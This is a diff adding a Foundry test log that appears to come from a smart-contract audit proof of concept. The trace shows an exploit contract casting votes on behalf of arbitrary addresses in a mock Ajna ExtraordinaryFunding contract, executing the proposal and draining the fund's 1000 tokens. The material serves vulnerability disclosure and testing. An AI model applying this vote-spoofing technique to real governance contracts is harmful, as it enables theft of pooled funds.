@@ -1,0 +1,86 @@
+No files changed, compilation skipped
+
+Ran 1 test for test/21301-extraordinary-proposal-steal-ajna_exp.sol:PoC_21301
+[PASS] test_arbitrary_account_argument_fabricates_extraordinary_votes() (gas: 1872172)
+Traces:
+  [1892072] PoC_21301::test_arbitrary_account_argument_fabricates_extraordinary_votes()
+    ├─ [1558521] → new Exploit@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
+    │   ├─ [252492] → new AjnaToken@0x104fBc016F4bb334D775a19E8A6510109AC63E00
+    │   │   └─ ← [Return] 1261 bytes of code
+    │   ├─ [598362] → new ExtraordinaryFunding@0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3
+    │   │   ├─  storage changes:
+    │   │   │   @ 3: 0 → 1000
+    │   │   └─ ← [Return] 2875 bytes of code
+    │   ├─  storage changes:
+    │   │   @ 1: 0 → 0x000000000000000000000000037eda3adb1198021a9b2e88c22b464fd38db3f3
+    │   │   @ 0: 0 → 0x000000000000000000000000104fbc016f4bb334d775a19e8a6510109ac63e00
+    │   └─ ← [Return] 2985 bytes of code
+    ├─ [290083] Exploit::run()
+    │   ├─ [22995] AjnaToken::mint(ExtraordinaryFunding: [0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3], 1000)
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x28c18e4882aeea099549551b7e2a669cb42cb29108aa24026a32b42c4ca60370: 0 → 1000
+    │   │   └─ ← [Stop]
+    │   ├─ [22886] ExtraordinaryFunding::setPower(0x00000000000000000000000000000000000000A1, 400)
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xa46c9a5e42ee711d67cec634bfb278f07133f8b3c236b826c53d763ec9766625: 0 → 400
+    │   │   └─ ← [Stop]
+    │   ├─ [22886] ExtraordinaryFunding::setPower(0x00000000000000000000000000000000000000b2, 350)
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x2979da46fa520d2a89531bdd54b474ac7be6cfa626f970e2f1d2fb85348157f5: 0 → 350
+    │   │   └─ ← [Stop]
+    │   ├─ [22886] ExtraordinaryFunding::setPower(0x00000000000000000000000000000000000000C3, 250)
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xee35841c17548388587a784902063d05d55a9b0c2bd1d722019b21d0acb575d2: 0 → 250
+    │   │   └─ ← [Stop]
+    │   ├─ [22669] ExtraordinaryFunding::proposeExtraordinary()
+    │   │   ├─  storage changes:
+    │   │   │   @ 4: 0 → 1
+    │   │   └─ ← [Return] 0
+    │   ├─ [46039] ExtraordinaryFunding::voteExtraordinary(0x00000000000000000000000000000000000000A1, 0)
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xa6eef7e35abe7026729641147f7915573c7e97b47efa546f5f6e3230263bcb49: 0 → 400
+    │   │   │   @ 0xaf3697142193f6574d68023b29a3f3a611047c92b56500f851c324001a01e464: 0 → 1
+    │   │   └─ ← [Return] 400
+    │   ├─ [24139] ExtraordinaryFunding::voteExtraordinary(0x00000000000000000000000000000000000000b2, 0)
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x200c8941b4d3874d7947b1b512fdc092f8796ab4b73f59ec8838a056d7066674: 0 → 1
+    │   │   │   @ 0xa6eef7e35abe7026729641147f7915573c7e97b47efa546f5f6e3230263bcb49: 400 → 750
+    │   │   └─ ← [Return] 350
+    │   ├─ [24139] ExtraordinaryFunding::voteExtraordinary(0x00000000000000000000000000000000000000C3, 0)
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xa6eef7e35abe7026729641147f7915573c7e97b47efa546f5f6e3230263bcb49: 750 → 1000
+    │   │   │   @ 0x2253387c96e0f140790460356a31fff19f940b15b943ad9059240649d8d3ba3c: 0 → 1
+    │   │   └─ ← [Return] 250
+    │   ├─ [49564] ExtraordinaryFunding::executeExtraordinary(Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0)
+    │   │   ├─ [801] AjnaToken::balanceOf(ExtraordinaryFunding: [0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3]) [staticcall]
+    │   │   │   └─ ← [Return] 1000
+    │   │   ├─ [23946] AjnaToken::transfer(Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1000)
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x996b860ef646da948c7d745162e3851398cba818db7bc8c7a4d9d465a54dfa11: 0 → 1000
+    │   │   │   │   @ 0x28c18e4882aeea099549551b7e2a669cb42cb29108aa24026a32b42c4ca60370: 1000 → 0
+    │   │   │   └─ ← [Return] true
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xa6eef7e35abe7026729641147f7915573c7e97b47efa546f5f6e3230263bcb4a: 0 → 1
+    │   │   └─ ← [Stop]
+    │   ├─ [801] AjnaToken::balanceOf(Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   └─ ← [Return] 1000
+    │   ├─  storage changes:
+    │   │   @ 2: 0 → 1000
+    │   └─ ← [Stop]
+    ├─ [426] Exploit::stolen() [staticcall]
+    │   └─ ← [Return] 1000
+    ├─ [0] VM::assertEq(1000, 1000) [staticcall]
+    │   └─ ← [Return]
+    ├─ [747] Exploit::token() [staticcall]
+    │   └─ ← [Return] AjnaToken: [0x104fBc016F4bb334D775a19E8A6510109AC63E00]
+    ├─ [705] Exploit::grantFund() [staticcall]
+    │   └─ ← [Return] ExtraordinaryFunding: [0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3]
+    ├─ [801] AjnaToken::balanceOf(ExtraordinaryFunding: [0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3]) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [0] VM::assertEq(0, 0) [staticcall]
+    │   └─ ← [Return]
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 965.71µs (682.75µs CPU time)
+
+Ran 1 test suite in 41.07ms (965.71µs CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
